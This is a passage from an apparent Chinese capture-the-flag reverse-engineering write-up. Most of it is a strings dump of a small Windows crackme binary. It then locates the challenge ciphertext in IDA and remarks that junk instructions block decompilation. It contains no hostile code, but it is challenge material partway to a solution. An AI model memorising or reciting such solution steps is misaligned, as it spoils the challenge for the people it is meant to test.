class="line">`.rdata</span><br><span class="line">@.data</span><br><span class="line">.fptable</span><br><span class="line">.reloc</span><br><span class="line">u&quot;h</span><br><span class="line">h`qA</span><br><span class="line">hDqA</span><br><span class="line">h@qA</span><br><span class="line">h8qA</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">&gt;csm</span><br><span class="line">SVW3</span><br><span class="line">ineI</span><br><span class="line">5ntel</span><br><span class="line">5Genu</span><br><span class="line">t#=`</span><br><span class="line">j$X9E</span><br><span class="line">_^[3</span><br><span class="line">j X+</span><br><span class="line">_^[]</span><br><span class="line">8_^]</span><br><span class="line">8csm</span><br><span class="line">8csm</span><br><span class="line">Y_^[</span><br><span class="line">t2VW</span><br><span class="line">&gt;csm</span><br><span class="line">?RCC</span><br><span class="line">?MOC</span><br><span class="line">?csm</span><br><span class="line">URPQQh</span><br><span class="line">L$,3</span><br><span class="line">UVWS</span><br><span class="line">[_^]</span><br><span class="line">SVWj</span><br><span class="line">Rh%&lt;@</span><br><span class="line">_^[]</span><br><span class="line">=0qA</span><br><span class="line">BVj(j</span><br><span class="line">hw&lt;@</span><br><span class="line">UQPXY]Y[</span><br><span class="line">Wu%j</span><br><span class="line">h |A</span><br><span class="line">Vh8|A</span><br><span class="line">h0|A</span><br><span class="line">h8|A</span><br><span class="line">%TpA</span><br><span class="line">VhL|A</span><br><span class="line">hD|A</span><br><span class="line">hL|A</span><br><span class="line">Vh\|A</span><br><span class="line">hT|A</span><br><span class="line">h\|A</span><br><span class="line">Vhp|A</span><br><span class="line">hh|A</span><br><span class="line">hp|A</span><br><span class="line">h||A</span><br><span class="line">QQSVWd</span><br><span class="line">;p$u</span><br><span class="line">p$^]</span><br><span class="line">oF f</span><br><span class="line">oF f</span><br><span class="line">oF f</span><br><span class="line">oV f</span><br><span class="line">o^0f</span><br><span class="line">of@f</span><br><span class="line">onPf</span><br><span class="line">ov`f</span><br><span class="line">o~pf</span><br><span class="line">FGIu</span><br><span class="line">FGIu</span><br><span class="line">YYPV</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">u SW</span><br><span class="line">EE,P</span><br><span class="line">_^[]</span><br><span class="line">dSVW</span><br><span class="line">;csm</span><br><span class="line">;csm</span><br><span class="line">u       9s</span><br><span class="line">;csm</span><br><span class="line">v!8E</span><br><span class="line">u QW</span><br><span class="line">uj_^[</span><br><span class="line">EE$P</span><br><span class="line">;MOC</span><br><span class="line">;RCC</span><br><span class="line">@u)j</span><br><span class="line">u Qj</span><br><span class="line">@_^[]</span><br><span class="line">9p u&quot;</span><br><span class="line">:csm</span><br><span class="line">ft&amp;9q</span><br><span class="line">:csm</span><br><span class="line">r49z</span><br><span class="line">@_^[]</span><br><span class="line">RVWS</span><br><span class="line">Y_^[</span><br><span class="line">&gt;csm</span><br><span class="line">8csm</span><br><span class="line">t0QW</span><br><span class="line">Y_^[</span><br><span class="line">hcsm</span><br><span class="line">u+;&#125;</span><br><span class="line">Y_^[</span><br><span class="line">unWQ</span><br><span class="line">Y_^[</span><br><span class="line">PPPPP</span><br><span class="line">,0&lt;     w</span><br><span class="line">,0&lt;     w</span><br><span class="line">SSSSS</span><br><span class="line">9^4t</span><br><span class="line">SSSSS</span><br><span class="line">9^4t</span><br><span class="line">SSSSS</span><br><span class="line">9^4t</span><br><span class="line">G0_^[]</span><br><span class="line">QSVW</span><br><span class="line">G0_^[</span><br><span class="line">QSVW</span><br><span class="line">G0_^[</span><br><span class="line">QQSVW</span><br><span class="line">G0_^[</span><br><span class="line">t&lt;Sj</span><br><span class="line">G0_^[</span><br><span class="line">QQSVW</span><br><span class="line">G0_^[</span><br><span class="line">SSSSS</span><br><span class="line">^88_</span><br><span class="line">SSSSS</span><br><span class="line">SSSSS</span><br><span class="line">A-&lt;Fu</span><br><span class="line">&lt;Nu4</span><br><span class="line">RRRRR</span><br><span class="line">9Q(u</span><br><span class="line">&lt;ItC&lt;Lt3&lt;Tt#&lt;h</span><br><span class="line">8&lt;6u</span><br><span class="line">A&lt;lt&#x27;&lt;tt</span><br><span class="line">&lt;zu1</span><br><span class="line">SVWP</span><br><span class="line">Xt$+</span><br><span class="line">F +F4+</span><br><span class="line">~2Pj0</span><br><span class="line">;F4u</span><br><span class="line">;F4u</span><br><span class="line">Y_^[</span><br><span class="line">QQSW</span><br><span class="line">^j4Yt</span><br><span class="line">C-&lt;at</span><br><span class="line">SWVQP</span><br><span class="line">&lt;Gu-</span><br><span class="line">&lt;-u</span><br><span class="line">G4QP</span><br><span class="line">O0_[</span><br><span class="line">PPPPP</span><br><span class="line">w0SV</span><br><span class="line">w0SV</span><br><span class="line">QSVW</span><br><span class="line">PPPPP</span><br><span class="line">PPPPP</span><br><span class="line">PPPPPPPP</span><br><span class="line">wGt&gt;</span><br><span class="line">PVVS</span><br><span class="line">Y[^_</span><br><span class="line">&lt; t1&lt;   t-</span><br><span class="line">=t7j</span><br><span class="line">Y_^[</span><br><span class="line">PPPPP</span><br><span class="line">Y_^]</span><br><span class="line">SSSSj</span><br><span class="line">Y_^[</span><br><span class="line">j Y+</span><br><span class="line">htqA</span><br><span class="line">hdqA</span><br><span class="line">YYh|qA</span><br><span class="line">hxqA</span><br><span class="line">Y_^[</span><br><span class="line">=csm</span><br><span class="line">h#lA</span><br><span class="line">h@lA</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">&gt;_^]</span><br><span class="line">f;1u</span><br><span class="line">%0qA</span><br><span class="line">PPPPP</span><br><span class="line">;1t+;u</span><br><span class="line">j-h@</span><br><span class="line">QSVW</span><br><span class="line">Wu;j</span><br><span class="line">h |A</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">j,hx</span><br><span class="line">Y_^[</span><br><span class="line">_^[]</span><br><span class="line">SVW3</span><br><span class="line">Y_^[</span><br><span class="line">_^[]</span><br><span class="line">M,j&quot;^QRRRRR</span><br><span class="line">u$RV</span><br><span class="line">j0Xu3</span><br><span class="line">j0Yf</span><br><span class="line">Vj0XPW</span><br><span class="line">r&quot;Sj</span><br><span class="line">dr&#x27;j</span><br><span class="line">jdVS</span><br><span class="line">j0Yj</span><br><span class="line">j0Yj</span><br><span class="line">M$j&quot;^Q</span><br><span class="line">QQQQQ</span><br><span class="line">80t/</span><br><span class="line">-jd_;</span><br><span class="line">QQQQQ</span><br><span class="line">PSWV</span><br><span class="line">Wj0V</span><br><span class="line">&#125;&#x27;9E</span><br><span class="line"> _^[</span><br><span class="line">PPPPP</span><br><span class="line">t,9F</span><br><span class="line">_^[]</span><br><span class="line">QQSVW</span><br><span class="line">SSSSS</span><br><span class="line">u0SP</span><br><span class="line">u0St:</span><br><span class="line">(_^[</span><br><span class="line">j&quot;_3</span><br><span class="line">VPPPPP</span><br><span class="line">QSVW</span><br><span class="line">u Vh</span><br><span class="line">f94H</span><br><span class="line">~&#x27;;Z</span><br><span class="line">Wj      P</span><br><span class="line">Wj      P</span><br><span class="line">_^[]</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">SVhd</span><br><span class="line">FLY;</span><br><span class="line">t       iu</span><br><span class="line">SSSSj</span><br><span class="line">_^[]</span><br><span class="line">*?QP</span><br><span class="line">PPPPP</span><br><span class="line">WWWWW</span><br><span class="line">&lt;:u</span><br><span class="line">SSSPSQ</span><br><span class="line">/&lt;.u</span><br><span class="line">uSSSSj</span><br><span class="line">_[^]</span><br><span class="line">Y_^[</span><br><span class="line">_^[]</span><br><span class="line">IH;A</span><br><span class="line">9wLt</span><br><span class="line">;3t&#x27;</span><br><span class="line">Y_^[</span><br><span class="line">X_^]</span><br><span class="line">wFt&amp;</span><br><span class="line">w=ty</span><br><span class="line">*ti-</span><br><span class="line">tL-c</span><br><span class="line">f9:t!V</span><br><span class="line">f9:u</span><br><span class="line">SSSS</span><br><span class="line">PVSS</span><br><span class="line">Wj=V</span><br><span class="line">u|9]</span><br><span class="line">Y_^[</span><br><span class="line">SSSSS</span><br><span class="line">PPPPP</span><br><span class="line">QQSVj8j@</span><br><span class="line">Y_[^]</span><br><span class="line">Y_^[</span><br><span class="line">xg;5</span><br><span class="line">_^[]</span><br><span class="line">@9&#125;</span><br><span class="line">YY^]</span><br><span class="line">Y_^[</span><br><span class="line">_^[]</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">SVW3</span><br><span class="line">_^[]</span><br><span class="line">WWWWW</span><br><span class="line">Y_^[</span><br><span class="line">PPPPP</span><br><span class="line">Y_^[</span><br><span class="line">xE;5</span><br><span class="line">SVWP</span><br><span class="line">SS@j</span><br><span class="line">L2.;</span><br><span class="line">Y_^[</span><br><span class="line">PVVVVV</span><br><span class="line">Y_^[</span><br><span class="line">SPPP</span><br><span class="line">[_^]</span><br><span class="line">^PQQQQQ</span><br><span class="line">E ^PQQQQ</span><br><span class="line">&gt;;9u</span><br><span class="line">wIPS3</span><br><span class="line">sv+3</span><br><span class="line">sv+3</span><br><span class="line">sv*Q</span><br><span class="line">sv*Q</span><br><span class="line">j&amp;Z;</span><br><span class="line">j&amp;Z;</span><br><span class="line">E H;</span><br><span class="line">j       _;</span><br><span class="line">PPPPP</span><br><span class="line">YY^[]</span><br><span class="line">@( t</span><br><span class="line">w WS</span><br><span class="line">u$_[</span><br><span class="line">PPPPPPPP</span><br><span class="line">PPPPPWV</span><br><span class="line">QQQP</span><br><span class="line">PPPSW</span><br><span class="line">PP9E u</span><br><span class="line">PPSWP</span><br><span class="line">VPRQ</span><br><span class="line">PRPQh</span><br><span class="line">^[_]</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">xK;5</span><br><span class="line">PQQQ</span><br><span class="line">PVVVVV</span><br><span class="line">Y_^[</span><br><span class="line">?VWk</span><br><span class="line">D8(Ht</span><br><span class="line">^f93u</span><br><span class="line">D8(HXtIf</span><br><span class="line">Nf9E</span><br><span class="line">Xf9E</span><br><span class="line">D8(Ht5F</span><br><span class="line">-^_[</span><br><span class="line">_f9;u</span><br><span class="line">Y_^[</span><br><span class="line">|*=2</span><br><span class="line">$SVW</span><br><span class="line">u       ^[3</span><br><span class="line">Wj      V</span><br><span class="line">&lt;$tL</span><br><span class="line"> u S</span><br><span class="line">&#123; WPV</span><br><span class="line">C VP</span><br><span class="line">w3t&quot;</span><br><span class="line">AP_^</span><br><span class="line">AP_^</span><br><span class="line">_^[]</span><br><span class="line">Y_^[</span><br><span class="line">Y_^[</span><br><span class="line">Y__^[</span><br><span class="line">v       N+D$</span><br><span class="line">WVS3</span><br><span class="line">WVU3</span><br><span class="line">v       N+D$</span><br><span class="line">^_[3</span><br><span class="line">0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/</span><br><span class="line">__based(</span><br><span class="line">__cdecl</span><br><span class="line">__stdcall</span><br><span class="line">__thiscall</span><br><span class="line">__fastcall</span><br><span class="line">__vectorcall</span><br><span class="line">__preserve_none</span><br><span class="line">__clrcall</span><br><span class="line">__eabi</span><br><span class="line">__swift_1</span><br><span class="line">__swift_2</span><br><span class="line">__swift_3</span><br><span class="line">__ptr64</span><br><span class="line">__restrict</span><br><span class="line">__unaligned</span><br><span class="line">restrict(</span><br><span class="line"> new</span><br><span class="line"> delete</span><br><span class="line">operator</span><br><span class="line">`vftable&#x27;</span><br><span class="line">`vbtable&#x27;</span><br><span class="line">`vcall&#x27;</span><br><span class="line">`typeof&#x27;</span><br><span class="line">`local static guard&#x27;</span><br><span class="line">`string&#x27;</span><br><span class="line">`vbase destructor&#x27;</span><br><span class="line">`vector deleting destructor&#x27;</span><br><span class="line">`default constructor closure&#x27;</span><br><span class="line">`scalar deleting destructor&#x27;</span><br><span class="line">`vector constructor iterator&#x27;</span><br><span class="line">`vector destructor iterator&#x27;</span><br><span class="line">`vector vbase constructor iterator&#x27;</span><br><span class="line">`virtual displacement map&#x27;</span><br><span class="line">`eh vector constructor iterator&#x27;</span><br><span class="line">`eh vector destructor iterator&#x27;</span><br><span class="line">`eh vector vbase constructor iterator&#x27;</span><br><span class="line">`copy constructor closure&#x27;</span><br><span class="line">`udt returning&#x27;</span><br><span class="line">`RTTI</span><br><span class="line">`local vftable&#x27;</span><br><span class="line">`local vftable constructor closure&#x27;</span><br><span class="line"> new[]</span><br><span class="line"> delete[]</span><br><span class="line">`omni callsig&#x27;</span><br><span class="line">`placement delete closure&#x27;</span><br><span class="line">`placement delete[] closure&#x27;</span><br><span class="line">`managed vector constructor iterator&#x27;</span><br><span class="line">`managed vector destructor iterator&#x27;</span><br><span class="line">`eh vector copy constructor iterator&#x27;</span><br><span class="line">`eh vector vbase copy constructor iterator&#x27;</span><br><span class="line">`dynamic initializer for &#x27;</span><br><span class="line">`dynamic atexit destructor for &#x27;</span><br><span class="line">`vector copy constructor iterator&#x27;</span><br><span class="line">`vector vbase copy constructor iterator&#x27;</span><br><span class="line">`managed vector copy constructor iterator&#x27;</span><br><span class="line">`local static thread guard&#x27;</span><br><span class="line">operator &quot;&quot;</span><br><span class="line">operator co_await</span><br><span class="line">operator&lt;=&gt;</span><br><span class="line"> Type Descriptor&#x27;</span><br><span class="line"> Base Class Descriptor at (</span><br><span class="line"> Base Class Array&#x27;</span><br><span class="line"> Class Hierarchy Descriptor&#x27;</span><br><span class="line"> Complete Object Locator&#x27;</span><br><span class="line">`anonymous namespace&#x27;</span><br><span class="line">FlsAlloc</span><br><span class="line">FlsFree</span><br><span class="line">FlsGetValue</span><br><span class="line">FlsSetValue</span><br><span class="line">InitializeCriticalSectionEx</span><br><span class="line">Unknown exception</span><br><span class="line">bad exception</span><br><span class="line">(null)</span><br><span class="line">CorExitProcess</span><br><span class="line">AreFileApisANSI</span><br><span class="line">CompareStringEx</span><br><span class="line">FlsGetValue2</span><br><span class="line">LCMapStringEx</span><br><span class="line">LocaleNameToLCID</span><br><span class="line">AppPolicyGetProcessTerminationMethod</span><br><span class="line">NAN(SNAN)</span><br><span class="line">nan(snan)</span><br><span class="line">NAN(IND)</span><br><span class="line">nan(ind)</span><br><span class="line">e+000</span><br><span class="line">Sunday</span><br><span class="line">Monday</span><br><span class="line">Tuesday</span><br><span class="line">Wednesday</span><br><span class="line">Thursday</span><br><span class="line">Friday</span><br><span class="line">Saturday</span><br><span class="line">January</span><br><span class="line">February</span><br><span class="line">March</span><br><span class="line">April</span><br><span class="line">June</span><br><span class="line">July</span><br><span class="line">August</span><br><span class="line">September</span><br><span class="line">October</span><br><span class="line">November</span><br><span class="line">December</span><br><span class="line">MM/dd/yy</span><br><span class="line">dddd, MMMM dd, yyyy</span><br><span class="line">HH:mm:ss</span><br><span class="line"> !&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~</span><br><span class="line"> !&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;|&#125;~</span><br><span class="line">d8L2</span><br><span class="line">[aOni*&#123;</span><br><span class="line">@2&amp;@</span><br><span class="line">&quot;RP(</span><br><span class="line">eLK(w</span><br><span class="line">FEMh</span><br><span class="line">h0&#x27;D</span><br><span class="line">owM&amp;</span><br><span class="line">~ $s%r</span><br><span class="line">@b;zO]</span><br><span class="line">$qE&#125;</span><br><span class="line">;*xh</span><br><span class="line">[&quot;93</span><br><span class="line">iu+-,</span><br><span class="line">\lo&#125;</span><br><span class="line">obwQ4</span><br><span class="line">&amp;Sgw</span><br><span class="line">R       E]</span><br><span class="line">?nz(</span><br><span class="line">=87M</span><br><span class="line">v2!L.2</span><br><span class="line">        cQr</span><br><span class="line">X/4B</span><br><span class="line">k=yI</span><br><span class="line">^&lt;V7w</span><br><span class="line">W&amp;|.</span><br><span class="line">1#INF</span><br><span class="line">1#QNAN</span><br><span class="line">1#SNAN</span><br><span class="line">1#IND</span><br><span class="line">lzZ?</span><br><span class="line">log10</span><br><span class="line">asin</span><br><span class="line">acos</span><br><span class="line">sqrt</span><br><span class="line">?log10</span><br><span class="line">        k8=</span><br><span class="line">?5Wg4p</span><br><span class="line">Nv$^</span><br><span class="line">w(@</span><br><span class="line">BC .=</span><br><span class="line">(lX</span><br><span class="line">#&#123; =</span><br><span class="line">`~R=</span><br><span class="line">&#125;s&quot;=</span><br><span class="line">%S#[k</span><br><span class="line">&quot;B &lt;1=</span><br><span class="line">\-!y</span><br><span class="line">#.X&#x27;=</span><br><span class="line">i9+=</span><br><span class="line">lzZ?</span><br><span class="line">sinh</span><br><span class="line">cosh</span><br><span class="line">tanh</span><br><span class="line">atan</span><br><span class="line">atan2</span><br><span class="line">ceil</span><br><span class="line">floor</span><br><span class="line">fabs</span><br><span class="line">modf</span><br><span class="line">ldexp</span><br><span class="line">_cabs</span><br><span class="line">_hypot</span><br><span class="line">fmod</span><br><span class="line">frexp</span><br><span class="line">_logb</span><br><span class="line">_nextafter</span><br><span class="line">.text$mn</span><br><span class="line">.text$x</span><br><span class="line">.idata$5</span><br><span class="line">.00cfg</span><br><span class="line">.CRT$XCA</span><br><span class="line">.CRT$XCAA</span><br><span class="line">.CRT$XCZ</span><br><span class="line">.CRT$XIA</span><br><span class="line">.CRT$XIAA</span><br><span class="line">.CRT$XIAC</span><br><span class="line">.CRT$XIC</span><br><span class="line">.CRT$XIZ</span><br><span class="line">.CRT$XPA</span><br><span class="line">.CRT$XPX</span><br><span class="line">.CRT$XPXA</span><br><span class="line">.CRT$XPZ</span><br><span class="line">.CRT$XTA</span><br><span class="line">.CRT$XTZ</span><br><span class="line">.rdata</span><br><span class="line">.rdata$r</span><br><span class="line">.rdata$sxdata</span><br><span class="line">.rdata$voltmd</span><br><span class="line">.rdata$zzzdbg</span><br><span class="line">.rtc$IAA</span><br><span class="line">.rtc$IZZ</span><br><span class="line">.rtc$TAA</span><br><span class="line">.rtc$TZZ</span><br><span class="line">.xdata$x</span><br><span class="line">.idata$2</span><br><span class="line">.idata$3</span><br><span class="line">.idata$4</span><br><span class="line">.idata$6</span><br><span class="line">.data</span><br><span class="line">.data$r</span><br><span class="line">.data$rs</span><br><span class="line">.bss</span><br><span class="line">.fptable</span><br><span class="line">UnhandledExceptionFilter</span><br><span class="line">SetUnhandledExceptionFilter</span><br><span class="line">GetCurrentProcess</span><br><span class="line">TerminateProcess</span><br><span class="line">IsProcessorFeaturePresent</span><br><span class="line">QueryPerformanceCounter</span><br><span class="line">GetCurrentProcessId</span><br><span class="line">GetCurrentThreadId</span><br><span class="line">GetSystemTimeAsFileTime</span><br><span class="line">InitializeSListHead</span><br><span class="line">IsDebuggerPresent</span><br><span class="line">GetStartupInfoW</span><br><span class="line">GetModuleHandleW</span><br><span class="line">KERNEL32.dll</span><br><span class="line">RtlUnwind</span><br><span class="line">GetLastError</span><br><span class="line">SetLastError</span><br><span class="line">EnterCriticalSection</span><br><span class="line">LeaveCriticalSection</span><br><span class="line">DeleteCriticalSection</span><br><span class="line">InitializeCriticalSectionAndSpinCount</span><br><span class="line">TlsAlloc</span><br><span class="line">TlsGetValue</span><br><span class="line">TlsSetValue</span><br><span class="line">TlsFree</span><br><span class="line">FreeLibrary</span><br><span class="line">GetProcAddress</span><br><span class="line">LoadLibraryExW</span><br><span class="line">EncodePointer</span><br><span class="line">RaiseException</span><br><span class="line">GetStdHandle</span><br><span class="line">WriteFile</span><br><span class="line">GetModuleFileNameW</span><br><span class="line">ExitProcess</span><br><span class="line">GetModuleHandleExW</span><br><span class="line">GetCommandLineA</span><br><span class="line">GetCommandLineW</span><br><span class="line">HeapAlloc</span><br><span class="line">HeapFree</span><br><span class="line">FlsAlloc</span><br><span class="line">FlsGetValue</span><br><span class="line">FlsSetValue</span><br><span class="line">FlsFree</span><br><span class="line">InitializeCriticalSectionEx</span><br><span class="line">VirtualProtect</span><br><span class="line">CompareStringW</span><br><span class="line">LCMapStringW</span><br><span class="line">GetFileType</span><br><span class="line">FindClose</span><br><span class="line">FindFirstFileExW</span><br><span class="line">FindNextFileW</span><br><span class="line">IsValidCodePage</span><br><span class="line">GetACP</span><br><span class="line">GetOEMCP</span><br><span class="line">GetCPInfo</span><br><span class="line">MultiByteToWideChar</span><br><span class="line">WideCharToMultiByte</span><br><span class="line">GetEnvironmentStringsW</span><br><span class="line">FreeEnvironmentStringsW</span><br><span class="line">SetEnvironmentVariableW</span><br><span class="line">SetStdHandle</span><br><span class="line">GetStringTypeW</span><br><span class="line">GetProcessHeap</span><br><span class="line">FlushFileBuffers</span><br><span class="line">GetConsoleOutputCP</span><br><span class="line">GetConsoleMode</span><br><span class="line">GetFileSizeEx</span><br><span class="line">SetFilePointerEx</span><br><span class="line">HeapSize</span><br><span class="line">HeapReAlloc</span><br><span class="line">CloseHandle</span><br><span class="line">ReadFile</span><br><span class="line">ReadConsoleW</span><br><span class="line">CreateFileW</span><br><span class="line">WriteConsoleW</span><br><span class="line">DecodePointer</span><br><span class="line">Enter input:</span><br><span class="line">Read error</span><br><span class="line">Memory error</span><br><span class="line">FuxNFb|$QXR#Xe#&#125;F#lqZ[`T@Q&amp;&amp;</span><br><span class="line">success</span><br><span class="line">fail</span><br><span class="line">%99s</span><br><span class="line"></span><br><span class="line">abcdefghijklmnopqrstuvwxyz</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line"></span><br><span class="line">abcdefghijklmnopqrstuvwxyz</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">.?AVbad_exception@std@@</span><br><span class="line">.?AVexception@std@@</span><br><span class="line">.?AVtype_info@@</span><br><span class="line">1!1P1</span><br><span class="line">2-3j3y3</span><br><span class="line">5$50595&gt;5D5N5X5h5x5</span><br><span class="line">6$6,676&lt;6B6L6V6i6n6|6</span><br><span class="line">6P7~7</span><br><span class="line">8/9[9</span><br><span class="line">:+:2:8:J:T:</span><br><span class="line">;C;R;[;h;~;</span><br><span class="line">&lt;.&lt;7&lt;=&lt;P&lt;</span><br><span class="line">=5=?=`=</span><br><span class="line">&gt;&amp;&gt;:&gt;?&gt;R&gt;q&gt;</span><br><span class="line">0(01070=0R0[0i0q0</span><br><span class="line">1 1&amp;1/151=1B1V1[1</span><br><span class="line">5#5&#x27;5+5/53575;5?5C5G5K5O5S5W5[5_5c5g5k5o5s5w5&#123;5</span><br><span class="line">&lt;!&lt;L&lt;P&lt;</span><br><span class="line">=*=4=&gt;=L=g=y=</span><br><span class="line">&gt;/&gt;W&gt;k&gt;&#125;&gt;</span><br><span class="line">?8?E?N?S?X?s?&#125;?</span><br><span class="line">0-0=0</span><br><span class="line">0$1?1D1W2h2D4W4u4</span><br><span class="line">416h6o6t6x6|6</span><br><span class="line">7 7$7(7,7</span><br><span class="line">9$909&gt;9N9c9z9</span><br><span class="line">:&amp;:/:</span><br><span class="line">;9;b;</span><br><span class="line">K7S7Y7</span><br><span class="line">9&amp;:g;&lt;=@=D=H=L=P=T=X=</span><br><span class="line">&lt;&#x27;&lt;.&lt;7&lt;M&lt;f&lt;&#123;&lt;</span><br><span class="line">&lt;P=U=</span><br><span class="line">2$2&lt;2J2m2</span><br><span class="line">3.373D3S3g3p3</span><br><span class="line">3$434</span><br><span class="line">575?5H5Q5b5s5</span><br><span class="line">5&lt;6H6M6S6X6`6f6n6</span><br><span class="line">6e7q7</span><br><span class="line">98:a:q:</span><br><span class="line">;&quot;;&lt;;u;</span><br><span class="line">&lt;       &lt;&quot;&lt;3&lt;8&lt;</span><br><span class="line">1P2e2</span><br><span class="line">3!3&#x27;383=3B3Q3b3g3l3|3</span><br><span class="line">354&lt;4O4d4</span><br><span class="line">5!5&gt;5b5</span><br><span class="line">6E6i6</span><br><span class="line">7&quot;707Q7X7o7</span><br><span class="line">;?;Y;</span><br><span class="line">&lt;a=g=</span><br><span class="line">101:1a1k1</span><br><span class="line">7%:E:</span><br><span class="line">=k&gt;9?</span><br><span class="line">N1m3x3</span><br><span class="line">4&#x27;4-4</span><br><span class="line">4)5Z5</span><br><span class="line">5X6n6   7</span><br><span class="line">8&#x27;898L8e8</span><br><span class="line">9%9O9V9</span><br><span class="line">070j0</span><br><span class="line">5/5z5</span><br><span class="line">5=6P6u6</span><br><span class="line">9L9f9x9</span><br><span class="line">:&quot;:&amp;:0:C:Q:g:</span><br><span class="line">20?0y0</span><br><span class="line">5L5[5i5</span><br><span class="line">6I6P6</span><br><span class="line">7 727D7V7h7z7</span><br><span class="line">8+8=8O8q91:</span><br><span class="line">=R=i=</span><br><span class="line">?B?z?</span><br><span class="line">0S0n0</span><br><span class="line">0\1c1j1q1~1</span><br><span class="line">3%3S3</span><br><span class="line">4w7p:</span><br><span class="line">:*&lt;]&lt;r&lt;|&lt;</span><br><span class="line">=N=]=</span><br><span class="line">4$5t5</span><br><span class="line">7!9*9</span><br><span class="line">1=1D1K1n1!9)9Z9a9</span><br><span class="line">J1y7</span><br><span class="line">7&#x27;868</span><br><span class="line">:1      3</span><br><span class="line">3Y4_4x4&#125;4</span><br><span class="line">7$8[8</span><br><span class="line">:\;p;</span><br><span class="line">&lt;+=9=D=</span><br><span class="line">=&#x27;&gt;6&gt;t&gt;</span><br><span class="line">2U2l2</span><br><span class="line">3$3.3j3</span><br><span class="line">6i6u6</span><br><span class="line">7&#x27;7I7Y7e7t7&quot;8b8</span><br><span class="line">8&#x27;9&lt;9E9N9k:</span><br><span class="line">;6&gt;W?</span><br><span class="line">5:5D5J5S5v5~5</span><br><span class="line">546V6</span><br><span class="line">7L7P7T7X7\7`7d7h7l7p7t7x7|7</span><br><span class="line">7=8W8d8</span><br><span class="line">:A;M;a;m;y;</span><br><span class="line">&lt;/&lt;?&lt;K&lt;Z&lt;m=</span><br><span class="line">&gt;4&gt;H&gt;S&gt;</span><br><span class="line">&gt;)?l?</span><br><span class="line">161F1</span><br><span class="line">3;5E5Y5c5&#123;5</span><br><span class="line">5-6&amp;7Z:</span><br><span class="line">:$;(;,;0;</span><br><span class="line">;#&gt;=&gt;N&gt;</span><br><span class="line">/0X0(1,1014181&lt;1@1D1</span><br><span class="line">1v2&#123;2</span><br><span class="line">8&quot;:Q;</span><br><span class="line">&lt;7&lt;T&lt;q&lt;</span><br><span class="line">01&lt;1H1L1P1T1X1\1h1l1p1</span><br><span class="line">2 2(20282@2H2P2X2`2h2p2x2</span><br><span class="line">3 3(30383@3H3P3X3`3h3p3x3</span><br><span class="line">4 4(40484@4H4P4X4`4h4p4x4</span><br><span class="line">5 5(50585@5H5P5</span><br><span class="line">?$?,?0?4?8?&lt;?</span><br><span class="line">6(7,7074787&lt;7@7D7H7L7P7T7X7\7`7d7h7l7p7t7x7|7</span><br><span class="line">8 8$8(8,8084888&lt;8@8D8H8L8P8T8X8\8`8d8h8l8p8t8x8|8</span><br><span class="line">42&lt;2D2L2T2\2d2l2t2|2</span><br><span class="line">3$3,343&lt;3D3L3T3\3d3l3t3|3</span><br><span class="line">4$4,444&lt;4D4L4T4\4d4l4t4|4</span><br><span class="line">5$5,545&lt;5D5L5T5\5d5l5t5|5</span><br><span class="line">6$6,646&lt;6D6L6T6\6d6l6t6|6</span><br><span class="line">7$7,747&lt;7D7L7T7\7d7l7t7|7</span><br><span class="line">8$8,848&lt;8D8L8T8\8d8l8t8|8</span><br><span class="line">9$9,949&lt;9D9L9</span><br><span class="line">P3X3`3h3p3x3</span><br><span class="line">4 4(40484@4H4P4X4`4h4p4x4</span><br><span class="line">5 5(50585@5H5P5X5`5h5p5x5</span><br><span class="line">6 6(60686@6H6P6X6`6h6p6x6</span><br><span class="line">7 7(70787@7H7P7X7`7h7p7x7</span><br><span class="line">8 8(80888@8H8P8X8`8h8p8x8</span><br><span class="line">9 9(90989@9H9P9X9`9h9p9x9</span><br><span class="line">: :(:0:8:@:H:P:X:`:h:</span><br><span class="line">7L8T8\8d8l8t8|8</span><br><span class="line">9$9,9 :$:d:h:p:</span><br><span class="line">:L;P;`;d;l;</span><br><span class="line">0,000L0P0p0x0|0</span><br><span class="line">14181@1H1P1T1\1p1x1</span><br><span class="line">2d2h2</span><br><span class="line">3,303P3p3</span><br><span class="line">404P4p4</span><br><span class="line">505P5p5</span><br><span class="line">6,606</span><br><span class="line">282H2X2h2x2</span><br><span class="line">8 8$8(8,8084888&lt;8</span><br></pre></td></tr></table></figure>
<p>不难发现密文<strong>FuxNFb|$QXR#Xe#}F#lqZ[`T@Q&amp;&amp;</strong></p>
<p>alt+T再交叉引用定位到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00401327 C7 85 E8 FE FF FF 30 E0 41 00     mov     dword ptr [ebp-118h], offset aFuxnfbQxrXeFLq ; &quot;FuxNFb|$QXR#Xe#&#125;F#lqZ[`T@Q&amp;&amp;&quot;</span><br></pre></td></tr></table></figure>
<p>F5无效，发现还没有函数，而且存在花指令：</p>
